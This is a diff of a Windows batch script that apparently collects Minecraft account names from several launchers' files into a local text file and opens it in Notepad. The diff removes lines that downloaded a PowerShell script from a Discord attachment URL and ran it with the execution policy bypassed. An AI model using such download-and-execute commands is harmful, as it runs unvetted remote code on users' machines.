@@ -5,12 +5,13 @@ if exist C:\Users\%username%\.lunarclient\settings\game\accounts.json (
     echo ==Lunar Accounts== >> %appdata%\SS\Alts.txt
     findstr /C:"name" C:\Users\%username%\.lunarclient\settings\game\accounts.json >> %appdata%\SS\Alts.txt
 )
+if exist %appdata%\.minecraft (
 echo ==.minecraft Accounts== >> %appdata%\SS\Alts.txt
-curl -o "%appdata%\SS\accounts.ps1" "https://cdn.discordapp.com/attachments/1130285640475492393/1130596617821634612/accounts.ps1" 2>nul
-powershell.exe -ExecutionPolicy Bypass -File "%appdata%\SS\accounts.ps1" >> %appdata%\SS\Alts.txt
+findstr /c:"name" "%appdata%\.minecraft\usercache.json" >> %appdata%\SS\Alts.txt
 if exist %appdata%\.minecraft\cosmic\accounts.json (
     echo ==Cosmic Client Accounts== >> %appdata%\SS\Alts.txt
     findstr /C:"displayName" "%appdata%\.minecraft\cosmic\accounts.json" >> %appdata%\SS\Alts.txt
+    )
 )
 if exist %appdata%\.tlauncher\legacy\Minecraft\game\tlauncher_profiles.json (
     echo ==Tlauncher Accounts== >> %appdata%\SS\Alts.txt
@@ -41,4 +42,4 @@ for /r "%appdata%\Badlion Client\logs\launcher" %%F in (*) do (
 endlocal
 
 notepad %appdata%\SS\Alts.txt
-pause>nul
+exit /b
